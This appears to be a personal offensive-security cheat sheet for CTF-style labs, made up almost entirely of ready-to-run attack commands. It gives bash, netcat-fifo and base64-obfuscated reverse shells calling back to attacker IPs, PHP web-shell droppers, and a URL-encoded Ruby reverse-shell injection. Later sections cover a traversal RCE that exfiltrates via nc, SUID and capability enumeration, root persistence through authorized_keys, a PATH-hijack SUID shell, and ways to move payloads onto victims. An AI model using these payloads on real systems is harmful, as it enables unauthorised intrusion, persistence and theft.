#offsecMethodo

# RCE
## _SSH Command Execution_
```
ssh -p 2220 bandit18@bandit.labs.overthewire.org -t "cat /home/bandit18/readme"
```

# reverShells
## _listener on a local port_
```
rlwrap nc -lvnp 1234
```
## _reverse shell from the remote server_
```
bash -i >& /dev/tcp/@IP/1234 0>&1
``` 
```
rm /tmp/f;mkfifo /tmp/f;cat /tmp/f\|/bin/sh -i 2>&1\|nc 10.10.17.161 1234 >/tmp/f
```
### can encode payload in Base64 
marche pour les formulaire
```
echo -n 'bash -i >& /dev/tcp/10.10.17.161/1234 0>&1' | base64 -w 0
```
```
echo YmFzaCAtaSA+JiAvZGV2L3RjcC8xMC4xMC4xNy4xNjEvMTIzNCAwPiYx | base64 -d | bash
```
## _Create end send a reverse shell php file to webvictim_
```
echo '<?php system ("rm /tmp/f;mkfifo /tmp/f;cat /tmp/f|/bin/sh -i 2>&1|nc 10.201.1.201 1234 >/tmp/f"); ?>' > shell.php
```
```
echo "<?php system("bash -c 'bash -i >& /dev/tcp/10.201.1.201/1234 0>&1'```
");?>" > shell.php
```
## _form post_
```
curl 'http://remote@ip' -X POST -d 'url=http%3A%2F%2FLOCAL-ADDRESS%3ALOCAL-PORT%2F%3Fname%3D%2520%60+ruby+-rsocket+-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%22LOCAL-ADDRESS%22%2CLOCAL-PORT%29%29%27%60'
```
	| `ctrl+z` then `stty raw -echo` then `fg` then `enter` twice | Upgrade shell TTY (2) |
	| `curl -X POST http://remot@IP/.%0d./.%0d./.%0d./bin/sh -d 'id | nc L@IP port'` | RCE
## _to allow the call backs on port 80 and 443 to our machine_
```
ufw allow from adresseip proto tcp to any port 80,443
```

## *linux update shell*
```
python3 -c 'import pty; pty.spawn("/bin/bash")'
```
```
script /dev/null -c bash
^Z
stty raw -echo; fg
reset 
screen
```


# foothold enum
## _lse_
https://github.com/diego-treitos/linux-smart-enumeration
## _distrib info_
```
lsb_release -a
```

```
sudo -l
```
## _find SUID files_
```
find / -perm /4000 -type f -exec ls -ld {} \; 2>/dev/null

```
## _user's files_
```
find / -user admin 2>/dev/null | grep -v '^/run\|^/proc\|^/sys'
```
## _users_ (display lines finished by sh)
```
cat /etc/passwd | grep sh$

```
## _ExploitCapability_
```
getcap -r / 2>/dev/null
```
## *con.d*
```
ls -la /etc/cron.d

```
## _search ps log_
```
./pspy
```
|
# Privilege Escalation Linux
```
bash -p

```
	| `sudo -l` | List available `sudo` privileges |
	| `sudo -u user /bin/echo Hello World!` | Run a command with `sudo` |
	| `sudo su -` | Switch to root user (if we have access to `sudo su`) |
	| `sudo su user -` | Switch to a user (if we have access to `sudo su`) |
	| `ssh-keygen -f key` | Create a new SSH key |
	| `echo "ssh-rsa AAAAB...SNIP...M= user@parrot" >> /root/.ssh/authorized_keys` | Add the generated public key to the user |
	| `ssh root@10.10.10.10 -i key` | SSH to the server with the generated private key |
# Exploit absolute path
```
% cat change-pass 
#!/bin/ksh user=$1 
passwd $user
```
Rewriting the script in Korn shell helps us avoid the C-shell problem , but we still have problems. The script is vulnerable to a hacker manipulating the PATH variable. Because the program uses relative path names, a hacker can change his PATH to use his own program instead of the regular /usr/bin/passwd program: 
```
% export PATH='/tmp' 
% echo "cp /bin/sh /tmp/sh;chown root /tmp/sh;chmod 4755/tmp/sh" >/tmp/passwd 
% ./change-pass
```
The PATH has been changed, and the change-pass command now runs the /tmp/passwd program instead of the /usr/bin /passwd program that we intended.

```
$ export PATH=/hack/path:$PATH
$ echo $PATH
```
# Transferring Files
Start a local webserver 
```
python3 -m http.server 80
```
Download a file on the remote server from our local machine 
```
wget http://10.10.14.1/linpeas.sh
```
## _curl_
```
curl http://10.10.14.1:8000/linenum.sh -o linenum.sh
```
## _base64_
Convert a file to `base64` 
```
base64 shell -w 0
```
Convert a file from `base64` back to its orig
```
echo f0VMR...SNIO...InmDwU \| base64 -d > shell
```
## _aws_
Copie an shell file on remote s3 bucket
```
aws --endpoint=http://s3.domaine_name s3 cp shell.php s3://domaine_name
```
## _ssh_
Transfer a file to the remote server with `scp` (requires SSH access) 
```
scp linenum.sh user@remotehost:/tmp/linenum.sh
```
Transfer a file from the remote server
```
scp remote_username@10.10.0.2:/remote/file.txt /local/directory
```
## **with nc**
	on local
```
nc -lvp port > file
```
 on remote host
```
nc -w 3 l@ip port < file
``` 

